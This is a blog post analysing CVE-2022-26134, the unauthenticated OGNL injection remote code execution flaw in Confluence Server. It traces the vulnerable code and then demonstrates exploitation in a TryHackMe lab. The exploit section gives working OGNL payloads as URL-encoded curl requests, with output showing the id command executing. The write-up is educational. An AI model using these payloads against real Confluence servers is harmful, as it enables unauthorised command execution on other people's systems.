---
layout: post
title: "Atlassian Confluence Server, What Went Wrong? (CVE-2022-26134)"
comments: true
description: "An Attempt to Learn From 0day"
tags: "Linux Pentesting 0day"
---

# Intro

On June 02, 2022, Atlassian published a [security advisory](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html) about a critical severity Unauthenticated Remote Code Execution vulnerability affecting Confluence Server and Data Center. According to the advisory, the vulnerability is being actively exploited and Confluence Server and Data Center versions after 1.3.0 are affected. The vulnerability is tracked as [CVE-2022-26134](https://nvd.nist.gov/vuln/detail/CVE-2022-26134) with 9.8 CVSSv3 score with multiple proof of concept exploits released by security researchers on GitHub.


CVE-2022-26134 is an unauthenticated OGNL Injection remote code execution vulnerability affecting Confluence Server and Data Center versions after 1.3.0. In order to exploit a vulnerable server, a remote attacker can send a malicious HTTP GET request with an OGNL payload in the URI. The vulnerable server once exploited it would allow the attacker to execute commands remotely with user privileges running the Confluence application. The vulnerability is fixed in Confluence versions 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4 and 7.18.1.

# Object-Graph Navigation Language (OGNL) 

Object-Graph Navigation Language (OGNL) is an open-source Expression Language (EL) used for getting and setting the properties of Java objects. OGNL started out as a way to set up associations between UI components and controllers using property names. As the desire for more complicated associations grew, Drew Davidson created what he called KVCL, for Key-Value Coding Language, egged on by Luke Blanshard. Luke then reimplemented the language using ANTLR, came up with the new name, and, egged on by Drew, filled it out to its current state. Later on Luke again reimplemented the language using JavaCC.

A simple example of OGNL in action can be found in [this article](https://www.pingidentity.com/en/resources/blog/post/a-simple-ognl-expression.html)written by John DaSilva. In short, it gives backend access to front-end attribute which usually involves HTTP's parameter.

# OGNL Injection

An OGNL Injection occurs when there is insufficient validation of user-supplied data, and the EL interpreter attempts to interpret it enabling attackers to inject their own EL code. For example, it is possible for the attacker to inject OGNL expressions (which can execute arbitrary malicious Java code), when an OGNL expression injection vulnerability is present

# What went wrong?

## [`ServletDispatcher`](https://docs.atlassian.com/DAC/javadoc/opensymphony-webwork/1.4-atlassian-17/reference/webwork/dispatcher/ServletDispatcher.html) Class

For the description I'll just quote from Atlassian.
	Main dispatcher servlet. It works in three phases: first propagate all parameters to the command JavaBean. Second, call execute() to let the JavaBean create the result data. Third, delegate to the JSP that corresponds to the result state that was chosen by the JavaBean.

```java
public static String getNamespaceFromServletPath(String servletPath) {
servletPath = servletPath.substring(0, servletPath.lastIndexOf("/"));
return servletPath;
}
```

The `getNamespaceFromServletPath` is used to obtain the namespace to which an Action belongs. This allows us to insert anything to be processed as long as it's sent before the last trailing slash.


## [`ActionChainResult`](https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/ActionChainResult.html) Class

The namespace processed then being processed by a method `execute` inside  `ActionChainResult` class as `this.namespace`.

```java
public void execute(final ActionInvocation invocation) throws Exception {
if (this.namespace == null) {
this.namespace = invocation.getProxy().getNamespace();
}
final OgnlValueStack stack = ActionContext.getContext().getValueStack();
final String finalNamespace = TextParseUtil.translateVariables(this.namespace, stack);
final String finalActionName = TextParseUtil.translateVariables(this.actionName, stack);
if (this.isInChainHistory(finalNamespace, finalActionName)) {
throw new XworkException("infinite recursion detected");
}
```

## [`TextParseUtil`](https://struts.apache.org/maven/struts2-core/apidocs/index.html?com/opensymphony/xwork2/util/TextParseUtil.html) Class

```java
package com.opensymphony.xwork.util;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
public class TextParseUtil
{
public static String translateVariables(final String expression, final OgnlValueStack stack) {
final StringBuilder sb = new StringBuilder();
final Pattern p = Pattern.compile("\\$\\{([^}]*)\\}");
final Matcher m = p.matcher(expression);
int previous = 0;
while (m.find()) {
final String g = m.group(1);
final int start = m.start();
String value;
try {
final Object o = stack.findValue(g);
value = ((o == null) ? "" : o.toString());
}
catch (Exception ignored) {
value = "";
}
sb.append(expression.substring(previous, start)).append(value);
previous = m.end();
}
if (previous < expression.length()) {
sb.append(expression.substring(previous));
}
return sb.toString();
}
}
```

Here the program tries to find the pattern based on regex `"\\$\\{([^}]*)\\}"` as defined by `p` variable. It uses the `Pattern.compile()` method to create the pattern and `matcher()` to search the pattern. Finaly, it uses `findValue()` method which will try to find the value by **Evaluating** the expression, making it possible to achieve Remote Code Execution.


# The Exploit 

To demonstrate the exploitation, I will be using the lab from [TryHackMe](https://tryhackme.com/room/cve202226134). The room includes a vulnerable version of Atlassian's [Confluence Server and Data Center editions](https://www.atlassian.com/software/confluence).


1. Set up
![init](/assets/attempt/atlassiancon/init1.png)
2. Crafting exploit
What we want to do to confirm the exploitation is to set a header that will show the command output. We can do it by using
```java
${@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-RCE-Output","ejak")}
```

Do not forget to URL encode everything and the final payload will look like:
```bash
 curl 'http://10.10.240.242:8090/$%7B@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(%22X-RCE-Output%22,%22ejak%22)%7D/
```

The result should look like this:
```bash
┌──(small㉿small)-[~]
└─$ curl 'http://10.10.240.242:8090/$%7B@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(%22X-RCE-Output%22,%22ejak%22)%7D/' -v
*   Trying 10.10.240.242:8090...
* Connected to 10.10.240.242 (10.10.240.242) port 8090 (#0)
> GET /$%7B@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(%22X-RCE-Output%22,%22ejak%22)%7D/ HTTP/1.1
> Host: 10.10.240.242:8090
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302
< X-ASEN: SEN-L18512764
< X-Confluence-Request-Time: 1664714923753
< Set-Cookie: JSESSIONID=FBCB9E68E3A3078D6A8C5C3F9606788D; Path=/; HttpOnly
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Content-Security-Policy: frame-ancestors 'self'
< **X-RCE-Output: ejak** <------------------------ Successful exploit
< Location: /login.action?os_destination=%2F%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-RCE-Output%22%2C%22ejak%22%29%7D%2Findex.action&permissionViolation=true
< Content-Type: text/html;charset=UTF-8
< Content-Length: 0
< Date: Sun, 02 Oct 2022 12:48:43 GMT
<
* Connection #0 to host 10.10.240.242 left intact
```
![Add Header](/assets/attempt/atlassiancon/addheader.png)
To escalate this to RCE, we can replace the value of the header with the output of a specified shell command.

We can achieve this by modifying our payload to look like this (stolen from Qualys):
```java
${(#rce=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Qualys-Response",#rce))}
```

The final payload will look like:
```bash
curl 'http://10.10.240.242:8090/%24%7B%28%23rce%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%22id%22%29%2EgetInputStream%28%29%2C%22utf%2D8%22%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsetHeader%28%22X%2DRCE%2DOutput%22%2C%23rce%29%29%7D/' -v
```

The result should reveal the user:
```bash
┌──(small㉿small)-[~]
└─$ curl 'http://10.10.240.242:8090/%24%7B%28%23rce%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%22id%22%29%2EgetInputStream%28%29%2C%22utf%2D8%22%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsetHeader%28%22X%2DRCE%2DOutput%22%2C%23rce%29%29%7D/' -v
*   Trying 10.10.240.242:8090...
* Connected to 10.10.240.242 (10.10.240.242) port 8090 (#0)
> GET /%24%7B%28%23rce%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%22id%22%29%2EgetInputStream%28%29%2C%22utf%2D8%22%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsetHeader%28%22X%2DRCE%2DOutput%22%2C%23rce%29%29%7D/ HTTP/1.1
> Host: 10.10.240.242:8090
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302
< X-ASEN: SEN-L18512764
< X-Confluence-Request-Time: 1664715958901
< Set-Cookie: JSESSIONID=578CA1DCB861B4F9AEA5B6800882A60A; Path=/; HttpOnly
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Content-Security-Policy: frame-ancestors 'self'
< X-RCE-Output: uid=1002(confluence) gid=1002(confluence) groups=1002(confluence)
< Location: /login.action?os_destination=%2F%24%7B%28%23rce%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-RCE-Output%22%2C%23rce%29%29%7D%2Findex.action&permissionViolation=true
< Content-Type: text/html;charset=UTF-8
< Content-Length: 0
< Date: Sun, 02 Oct 2022 13:05:58 GMT
<
* Connection #0 to host 10.10.240.242 left intact

```

![Exploit](/assets/attempt/atlassiancon/exploit.png)



